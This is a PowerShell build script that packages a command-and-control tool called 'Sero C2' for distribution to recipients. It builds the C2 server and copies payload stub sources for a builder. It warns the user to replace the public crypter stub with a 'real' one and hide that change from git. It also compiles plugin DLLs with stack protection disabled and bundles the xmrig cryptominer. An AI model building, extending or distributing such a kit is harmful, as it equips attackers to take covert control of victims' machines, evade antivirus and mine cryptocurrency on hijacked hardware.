# Sero C2 - Build & package for distribution
# Usage: powershell -ExecutionPolicy Bypass -File build.ps1
# Or:    double-click build.bat

$ErrorActionPreference = "Stop"
$Root   = $PSScriptRoot
$Server = Join-Path $Root "server"
$Out    = Join-Path $Root "dist"

function Write-Step($msg) { Write-Host "[*] $msg" -ForegroundColor Cyan }
function Write-OK($msg)   { Write-Host "[+] $msg" -ForegroundColor Green }
function Write-Err($msg)  { Write-Host "[!] $msg" -ForegroundColor Red; exit 1 }

Write-Host "=== Sero C2 - Build ===" -ForegroundColor Yellow

# Clean output
if (Test-Path $Out) { Remove-Item $Out -Recurse -Force }
New-Item -ItemType Directory -Path $Out | Out-Null

# Build server (self-contained, no runtime needed on target)
Write-Step "Building server (net10.0-windows)..."
$csproj = Get-ChildItem $Server -Filter "*.csproj" | Select-Object -First 1
if (-not $csproj) { Write-Err "No .csproj found in server/" }

$tmpOut = Join-Path $env:TEMP "sero_publish_$(Get-Random)"
dotnet publish $csproj.FullName `
    -c Release `
    -r win-x64 `
    --self-contained `
    -p:DebugType=None `
    -p:PublishTrimmed=false `
    -o $tmpOut

if ($LASTEXITCODE -ne 0) { Write-Err "Server build failed" }

# Copy the entire publish folder as dist\server\
$serverOut = Join-Path $Out "server"
if (Test-Path $serverOut) { Remove-Item $serverOut -Recurse -Force }
Copy-Item $tmpOut $serverOut -Recurse
Write-OK "Server -> dist\server\SeroServer.exe"

# ── Crypter.cs stub check ──────────────────────────────────────────────────
$crypterCs = Join-Path $Server "Builder\Crypter.cs"
if (Test-Path $crypterCs) {
    $firstLine = Get-Content $crypterCs -TotalCount 1
    if ($firstLine -match '// STUB') {
        Write-Host "[!] WARNING: server/Builder/Crypter.cs is the public stub." -ForegroundColor Yellow
        Write-Host "    Replace it with your real Crypter.cs before distributing." -ForegroundColor Yellow
        Write-Host "    Run: git update-index --assume-unchanged server/Builder/Crypter.cs" -ForegroundColor DarkGray
    } else {
        Write-OK "Crypter.cs: real implementation detected."
    }
}

# Copy Stubs (needed by crypter/loader at runtime - csproj already marks them PreserveNewest,
# but we copy explicitly here too in case of edge cases with the publish pipeline)
$stubsSrc = Join-Path $Server "Stubs"
$stubsDst = Join-Path $serverOut "Stubs"
if (Test-Path $stubsSrc) {
    New-Item -ItemType Directory -Path $stubsDst -Force | Out-Null
    Copy-Item (Join-Path $stubsSrc "*") $stubsDst -ErrorAction SilentlyContinue
    Write-OK "Stubs -> dist\server\Stubs\"
}

# ── Pre-compile C++ plugins (plugin_*.cpp in Stubs/) ──────────────────────
# Requires MSVC cl.exe - searches common VS installation paths.
# Plugin DLLs are placed in dist\server\Stubs\ so they can be loaded at runtime
# without needing the user to have a compiler installed on the target server.

function Find-ClExe {
    # Try cl.exe on PATH first (already inside a VS Developer Command Prompt)
    try {
        $cl = (Get-Command cl.exe -ErrorAction Stop).Source
        return @{ Cl = $cl; VcVars = $null }
    } catch { }
    # Search common VS install roots
    $vsRoots = @(
        "${env:ProgramFiles}\Microsoft Visual Studio",
        "${env:ProgramFiles(x86)}\Microsoft Visual Studio"
    )
    foreach ($vsRoot in $vsRoots) {
        if (-not (Test-Path $vsRoot)) { continue }
        $found = Get-ChildItem $vsRoot -Recurse -Filter "cl.exe" -ErrorAction SilentlyContinue |
                 Where-Object { $_.FullName -match "Hostx64\\x64|Hostx86\\x64" } |
                 Select-Object -First 1
        if ($found) {
            # Extract <VS>\VC root from the path using regex — more reliable than counting .Parent
            # Path pattern: ...\VC\Tools\MSVC\<ver>\bin\Hostx64\x64\cl.exe
            $vcVars = $null
            if ($found.FullName -match '^(.+?\\VC)\\Tools\\MSVC\\') {
                $vcRoot = $Matches[1]
                foreach ($bat in @("Auxiliary\Build\vcvars64.bat", "Auxiliary\Build\vcvarsall.bat")) {
                    $candidate = Join-Path $vcRoot $bat
                    if (Test-Path $candidate) { $vcVars = $candidate; break }
                }
            }
            return @{ Cl = $found.FullName; VcVars = $vcVars }
        }
    }
    return $null
}

$pluginCpps = Get-ChildItem $stubsSrc -Filter "plugin_*.cpp" -ErrorAction SilentlyContinue
if ($pluginCpps -and $pluginCpps.Count -gt 0) {
    Write-Step "Pre-compiling $($pluginCpps.Count) plugin(s) from Stubs/..."
    $clInfo = Find-ClExe
    if ($clInfo) {
        $clExe  = $clInfo.Cl
        $vcVars = $clInfo.VcVars
        Write-Host "  cl.exe: $clExe" -ForegroundColor DarkGray
        if ($vcVars) { Write-Host "  vcvars: $vcVars" -ForegroundColor DarkGray }

        foreach ($cpp in $pluginCpps) {
            $baseName = [System.IO.Path]::GetFileNameWithoutExtension($cpp.Name)
            $dllOut   = Join-Path $stubsDst "$baseName.dll"
            $objOut   = Join-Path $stubsDst "$baseName.obj"
            $clArgs   = "`"$($cpp.FullName)`" /LD /O2 /GS- /MT /W0 /nologo /Fe`"$dllOut`" /Fo`"$objOut`" kernel32.lib user32.lib advapi32.lib ole32.lib oleaut32.lib shell32.lib /link /INCREMENTAL:NO /OPT:REF /OPT:ICF"

            if ($vcVars) {
                # Normal PowerShell (no VS env): use a temp .bat to call vcvars then cl.exe.
                # Use the full path to cl.exe so it works even if vcvars fails to update PATH.
                $vcVarsCall = if ($vcVars -match 'vcvarsall') { "`"$vcVars`" x64" } else { "`"$vcVars`"" }
                $tmpBat = [System.IO.Path]::ChangeExtension([System.IO.Path]::GetTempFileName(), '.bat')
                [System.IO.File]::WriteAllText($tmpBat, "@echo off`r`ncall $vcVarsCall >nul 2>&1`r`n`"$clExe`" $clArgs`r`n")
                $psi = New-Object System.Diagnostics.ProcessStartInfo
                $psi.FileName  = "cmd.exe"
                $psi.Arguments = "/c `"$tmpBat`""
            } else {
                # Already in VS Developer Command Prompt: call cl.exe directly
                $psi = New-Object System.Diagnostics.ProcessStartInfo
                $psi.FileName  = $clExe
                $psi.Arguments = $clArgs
            }
            $psi.RedirectStandardOutput = $true
            $psi.RedirectStandardError  = $true
            $psi.UseShellExecute        = $false
            $psi.CreateNoWindow         = $true
            $proc   = [System.Diagnostics.Process]::Start($psi)
            $stdout = $proc.StandardOutput.ReadToEnd()
            $stderr = $proc.StandardError.ReadToEnd()
            $proc.WaitForExit()
            if ($vcVars) { Remove-Item $tmpBat -ErrorAction SilentlyContinue }

            if ($proc.ExitCode -eq 0 -and (Test-Path $dllOut)) {
                $sz = [math]::Round((Get-Item $dllOut).Length / 1KB, 0)
                Write-OK "  $baseName.dll ($sz KB)"
                Remove-Item $objOut -ErrorAction SilentlyContinue
            } else {
                Write-Host "  [!] $baseName compile failed (exit $($proc.ExitCode))" -ForegroundColor Yellow
                if ($stdout) { Write-Host $stdout.TrimEnd() -ForegroundColor DarkGray }
                if ($stderr) { Write-Host $stderr.TrimEnd() -ForegroundColor DarkGray }
                # 0xC0000005 = STATUS_ACCESS_VIOLATION: cl.exe was killed mid-compile.
                # Common cause: Hyper-V throttles/pauses the VM when its window goes to the background.
                # Fix: keep the VM window in the foreground during the build, or raise the VM CPU reserve.
                if ($proc.ExitCode -eq -1073741819) {
                    Write-Host "      -> cl.exe killed (0xC0000005 ACCESS_VIOLATION)" -ForegroundColor DarkYellow
                    Write-Host "         Likely cause: Hyper-V paused/throttled the VM while it was in the background." -ForegroundColor DarkYellow
                    Write-Host "         Fix: keep the VM window in the foreground during the build," -ForegroundColor DarkYellow
                    Write-Host "              or increase the VM CPU reserve in Hyper-V settings." -ForegroundColor DarkYellow
                }
                # C1083 on ctype.h / corecrt.h / stddef.h = UCRT headers missing from the Windows SDK.
                # These are NOT in the UM or Shared include dirs — they live in the separate 'ucrt' folder.
                # vcvars64.bat normally adds it, but only if "Windows Universal CRT SDK" was installed.
                $combinedOut = "$stdout`n$stderr"
                if ($combinedOut -match "C1083" -and $combinedOut -match "windows\.h|winnt\.h|winsock2\.h|winsock\.h") {
                    Write-Host "      -> Missing Windows SDK headers (C1083 on windows.h)" -ForegroundColor DarkYellow
                    Write-Host "         Cause: The Windows SDK is not installed or not found by cl.exe." -ForegroundColor DarkYellow
                    Write-Host "         Fix:   Open Visual Studio Installer → Modify → Individual components" -ForegroundColor DarkYellow
                    Write-Host "                → check 'Windows 10/11 SDK' → Install." -ForegroundColor DarkYellow
                    Write-Host "         Alt:   Install the latest Windows SDK from developer.microsoft.com/windows/downloads/windows-sdk" -ForegroundColor DarkYellow
                }
                elseif ($combinedOut -match "C1083" -and $combinedOut -match "ctype\.h|corecrt\.h|stddef\.h|stdlib\.h") {
                    Write-Host "      -> Missing UCRT headers (C1083 on C runtime include)" -ForegroundColor DarkYellow
                    Write-Host "         Cause: The 'Windows Universal CRT SDK' component is not installed." -ForegroundColor DarkYellow
                    Write-Host "         Fix:   Open Visual Studio Installer → Modify → Individual components" -ForegroundColor DarkYellow
                    Write-Host "                → check 'Windows Universal CRT SDK' → Install." -ForegroundColor DarkYellow
                    Write-Host "         Alt:   Install the latest Windows SDK from developer.microsoft.com/windows/downloads/windows-sdk" -ForegroundColor DarkYellow
                }
            }
        }
    } else {
        Write-Host "[!] cl.exe not found - plugin DLLs not pre-compiled." -ForegroundColor Yellow
        Write-Host "    Install Visual Studio with the C++ Desktop workload and re-run." -ForegroundColor DarkGray
    }
}


# Copy stub source (needed by builder at runtime)
$stubSrc = Join-Path $Root "stub"
$stubOut = Join-Path $Out "stub"
if (Test-Path $stubSrc) {
    New-Item -ItemType Directory -Path $stubOut | Out-Null
    Copy-Item (Join-Path $stubSrc "*.cs")     $stubOut -ErrorAction SilentlyContinue
    Copy-Item (Join-Path $stubSrc "*.csproj") $stubOut -ErrorAction SilentlyContinue
    Copy-Item (Join-Path $stubSrc "*.xml")    $stubOut -ErrorAction SilentlyContinue
    Write-OK "Stub sources -> dist\stub\"
} else {
    Write-Host "[!] Warning: stub/ directory not found - builder tab will not work." -ForegroundColor Yellow
}


# Create xmrig-release placeholder (place xmrig.exe here before packaging)
$xmrigOut = Join-Path $Out "xmrig-release"
New-Item -ItemType Directory -Path $xmrigOut -Force | Out-Null
$xmrigSrc = Join-Path $Root "xmrig-release"
if (Test-Path $xmrigSrc) {
    Get-ChildItem $xmrigSrc -File | ForEach-Object {
        Copy-Item $_.FullName $xmrigOut -ErrorAction SilentlyContinue
    }
}
Write-OK "xmrig-release -> dist\xmrig-release\"

# Copy icon
Get-ChildItem $Root -Filter "*.ico" | ForEach-Object { Copy-Item $_.FullName $Out -ErrorAction SilentlyContinue }

# Copy setup files so recipients can install prerequisites before running
Copy-Item (Join-Path $Root "setup.bat")               $Out -ErrorAction SilentlyContinue
Copy-Item (Join-Path $Root "setup-prerequisites.ps1") $Out -ErrorAction SilentlyContinue
Write-OK "setup.bat + setup-prerequisites.ps1 -> dist\"

# Cleanup temp
Remove-Item $tmpOut -Recurse -Force -ErrorAction SilentlyContinue

Write-OK "Build complete -> dist\"
Write-Host ""
Get-ChildItem $Out -Recurse | ForEach-Object {
    Write-Host ("  " + $_.FullName.Replace($Out + "\", ""))
}
Write-Host ""
Write-Host "No prerequisites on target machine (self-contained)." -ForegroundColor Gray
